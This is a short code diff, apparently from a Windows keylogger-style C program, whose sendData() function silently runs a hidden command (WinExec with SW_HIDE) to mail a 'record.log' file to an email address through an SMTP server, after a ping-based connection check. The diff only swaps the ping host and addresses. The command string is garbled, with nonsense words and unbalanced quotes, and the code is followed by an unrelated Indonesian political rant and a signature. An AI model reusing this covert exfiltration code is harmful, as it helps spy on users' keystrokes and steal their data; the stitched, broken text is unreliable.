@@ -54,7 +54,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.googlep.co.id -n 1")){ ///check! connection
+            if(!system("ping  www.google.co.id -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -145,7 +145,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:113 -v --mail-from \"    fadliwiryawirawan@googleone.com\" --mail-rcpt \" fadliwiryawirawan@googleone.com " --ssl -u    fadliwiryawirawan@googleone.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:113 -v --mail-from \"    fadliwiryawirawan@google.com\" --mail-rcpt \" fadliwiryawirawan@google.com " --ssl -u    fadliwiryawirawan@google.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); " putuskan semua hubungan technologi dengan nabilah taqiah , sudah ckup mempermainkan intergritas kami di semua sektor technologi , kerane rakyat tidak bisa berperan tinggi untuk saling menjatuhkan dalam postur bernegara sipil , kepemilikan sosial dalam seluaruh wilayah , negara indonesian tetap mempertahankan wilayah provinsi tidak bisa seperti aceh merdeka !!! 
 @copy right fadliwiryawirawan 
 signiture  
